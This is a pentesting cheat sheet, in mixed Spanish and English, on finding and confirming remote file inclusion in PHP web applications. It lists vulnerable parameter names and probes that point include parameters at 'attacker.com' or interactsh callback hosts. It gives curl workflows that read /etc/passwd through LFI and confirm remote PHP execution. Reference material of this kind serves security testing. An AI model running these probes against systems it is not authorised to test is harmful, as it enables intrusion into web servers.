---
aliases:
  - RFI Detection
  - Remote File Inclusion Recon
tags:
  - type/cheatsheet
  - vuln/rfi
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
---
# RFI - Detección y Reconocimiento

***

## Identificar Endpoints Vulnerables

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?page=home`, `?file=about` | Page selector via param | Most common. |
| `?include=`, `?inc=` | Generic include | Direct. |
| `?template=`, `?tmpl=` | Template loader | Common CMS. |
| `?lang=`, `?locale=` | Language file load | i18n. |
| `?theme=`, `?skin=` | Theme files | CMS. |
| `?module=`, `?mod=` | Module loader | Plugin systems. |
| `?view=` | View selector | MVC. |
| `?content=` | Content load | Dynamic. |
| `?path=`, `?file=` | Direct file param | Generic. |
| `?action=`, `?do=` | Action handler | RPC-style. |
| Body POST con file field | POST RFI | Less common. |
| Header reflected (X-Custom) | Edge | App-specific. |
| Combine con LFI patterns | Same endpoints often | Adjacent. |
| PHP `include()`, `require()` direct | Source code review | High value. |
| `include_once()`, `require_once()` | Same | Same. |
| `file_get_contents()` con URL | File read RFI variant | Limited. |
| Smarty `{include}` | Template engine | Edge. |
| Legacy CMS / forums | Old PHP apps | OSINT. |
| Default extension append | App appends `.php` → null byte trick | Standard. |
^rfi-detect-endpoints

___

## Probes con URL Remota

| **Probe** | **Payload** | **Indicador** |
|:---:|:---:|:---:|
| Basic HTTP | `?page=http://attacker.com/test.php` | If executed → RFI active. |
| HTTPS | `?page=https://attacker.com/test.php` | TLS variant. |
| Burp Collaborator | `?page=http://<id>.oast.fun/test.php` | Auto-detect callback. |
| Domain you control | Setup own listener | Standard. |
| Force-load benign | `<?php phpinfo(); ?>` con phpinfo en payload | Confirm execution. |
| Echo marker | `<?php echo "RFI-CONFIRMED"; ?>` | Simple test. |
| Time-delay test | `<?php sleep(10); ?>` | Confirm executes. |
| HTTP server simple | `python3 -m http.server 80` | Quick listener. |
| nc listener | `nc -lvnp 80` | Verify HTTP request received. |
| Multiple paths probe | Iterate per param | Bulk discovery. |
| Verbose error response | Triggers PHP error if RFI tries fail | Indicator. |
| Allow_url_include = On indicator | Successful HTTP fetch + execution | Confirms config. |
| `data://` probe | Inline alternative | Same family. |
| `php://input` probe | POST body include | Alternative. |
| Differential path response | `local.txt` (LFI works) vs `http://...` (RFI works) | Identify which feature. |
^rfi-detect-probes

### Probe rápido

```bash
TARGET="https://target/index.php"
PARAM="page"
COLLAB=$(./interactsh-client -url-only)

# Listen for callback
# (interactsh-client running, or:)
# python3 -m http.server 80 &

# Probe HTTP RFI
curl -s "${TARGET}?${PARAM}=http://${COLLAB}/test"

# Watch interactsh dashboard
# If callback received → RFI / SSRF active
# If atacante also serves PHP code → confirm execution
```

___

## Detectar PHP Version + `allow_url_include`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| PHP version header | `X-Powered-By: PHP/x.y.z` response header | Standard. |
| phpinfo() page | `/phpinfo.php`, `/info.php`, `/test.php` | Discovery. |
| Error message PHP version | Verbose errors mention version | Standard. |
| Cookie session | `PHPSESSID=...` confirms PHP | Stack confirm. |
| `allow_url_include = On` | Required for HTTP RFI | Critical config. |
| `allow_url_fopen = On` | Required for any URL fetch | Adjacent. |
| PHP 5.2.0+ default | `allow_url_include = Off` | Modern PHP. |
| Pre-PHP 5.2 | Default On — vulnerable | Legacy. |
| Test via wrapper | `?page=php://filter/...` confirms PHP | Stack confirm. |
| LFI works but RFI fails | `allow_url_include = Off` likely | Inferer. |
| Specific file disclosure | Try `?page=/etc/passwd` (LFI) vs `?page=http://...` (RFI) | Distinguish. |
| Server header | `Apache`, `nginx + PHP-FPM` | Stack hint. |
| Response time differential | Remote fetch slower than local include | Indicator. |
| Combine con error hunting | Trigger PHP errors for version + paths | Recon. |
| Source disclosure via LFI | `php://filter/convert.base64-encode` | Read PHP source con LFI. |
^rfi-detect-php

### Workflow detect PHP + RFI capability

```bash
TARGET="https://target/index.php"

# Stage 1: Confirm PHP stack
curl -sI "$TARGET" | grep -i 'x-powered-by\|set-cookie'
# Expected: X-Powered-By: PHP/x.y.z, Set-Cookie: PHPSESSID=...

# Stage 2: Try LFI probe first
curl -s "${TARGET}?page=/etc/passwd" | grep -E 'root:x:0:0:'
# If works → LFI active, allow_url_include status unknown

# Stage 3: Try RFI probe
COLLAB=$(./interactsh-client -url-only)
curl -s "${TARGET}?page=http://${COLLAB}/test"
# Watch dashboard for HTTP request

# Stage 4: Confirm execution
# Atacante hostea on $COLLAB:
#   <?php echo "RFI-CONFIRMED"; ?>
# Response contains "RFI-CONFIRMED" → RFI works (allow_url_include=On)

# Stage 5: If LFI works but no RFI:
#   - allow_url_include = Off
#   - Use php://filter, data:// alternatives
#   - Or LFI to RCE chain (log poisoning, etc)
```

***
